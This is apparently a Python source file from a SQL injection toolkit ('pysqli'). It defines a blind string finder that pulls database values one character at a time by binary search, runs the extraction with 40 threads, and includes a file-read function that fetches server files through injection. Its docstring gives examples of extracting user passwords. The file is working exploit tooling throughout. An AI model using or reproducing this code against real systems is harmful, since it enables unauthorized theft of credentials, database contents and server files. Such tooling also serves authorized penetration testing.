import sys
from multiprocessing.pool import ThreadPool

from pysqli.blind_tester import BlindTester
from pysqli.payloads import MysqlPayloads
from pysqli.percent_display import ThreadedPercentDisplay
from pysqli.string_finder import StringFinder
from pysqli.tools import *


class BlindStringFinder(StringFinder):
    """
    String finder based on the blind technique.
    """

    def __init__(self, tester: BlindTester, payloads=MysqlPayloads()):
        """
        Create a BlindTester based on a BlindTester
        :param tester: BlindTester
        :param payloads payloads collection
        """
        self.pd = None
        self.tester = tester
        self.payloads = payloads
        self.stop = False

    def search_length(self, sql, a, b):
        if a == b:
            return a
        if b - a == 1:
            if self.tester.test(self.payloads.and_size_eq.format(sql, b)):
                return b
            else:
                return a
        pivot = int((a + b) / 2)
        # print("[*] pivot : {} / {}-{}".format(pivot,a, b))
        if self.tester.test(self.payloads.and_size_lt.format(sql, pivot)):
            return self.search_length(sql, a, pivot)
        else:
            return self.search_length(sql, pivot, b)

    def str_length(self, sql):
        i = 1
        while not self.tester.test(self.payloads.and_size_lt.format(sql, i)):
            i *= 2
        # print("[*] LENGTH({}) > i".format(sql, i))
        return self.search_length(sql, int(i / 2), i)

    def search_char(self, sql, i, a, b):
        if a == b:
            return a
        if b - a == 1:
            if self.tester.test(self.payloads.and_char_at_is.format(sql, i, b)):
                return b
            else:
                return a
        pivot = int((a + b) / 2)
        # print("[*] pivot : {} / {}-{}".format(pivot,a, b))
        if self.tester.test(self.payloads.and_char_at_lt.format(sql, i, pivot)):
            return self.search_char(sql, i, a, pivot)
        else:
            return self.search_char(sql, i, pivot, b)

    def read_string(self, sql):
        """
        Read a string via the blind technique.
        The search is multithreaded.
        Use parentheses if possible ("(SELECT version())" in place of "SELECT version()")
        see SqliEncoder to encode the string if quotes are not possibles.

        :param sql: sql code to read.
                    examples :  - (SELECT pass FROM users LIMIT 1 OFFSET 2)
                                - (SELECT version())

        :return:
        """
        if self.tester.test(self.payloads.and_size_gt.format(sql, 0)):

            sys.stdout.write('[(calculating length)]')
            sys.stdout.flush()

            length = self.str_length(sql)
            sys.stdout.write('\r')
            sys.stdout.flush()
            tpd = ThreadedPercentDisplay(length)
            tpd.start()

            def f(i):
                try:
                    char = chr(self.search_char(sql, i, 10, 127))
                    tpd.add(1)
                    return char
                except Exception as e:
                    print('[-] error on get char {} (will be \'*\') {}'.format(i, e))
                    return '*'

            with ThreadPool(40) as pool:
                finded_str = ''.join(pool.map(f, range(1, length + 1)))
                tpd.stop_update_display()
                return finded_str
        else:
            print("[-] string {} do not exist or is null".format(sql))

    def read_file(self, filename):
        """
        Read a file via the read_string technique.

        :param filename: name of the file to read
        :return:
        """
        return self.read_string(self.payloads.str_file.format(encode_str(filename)))
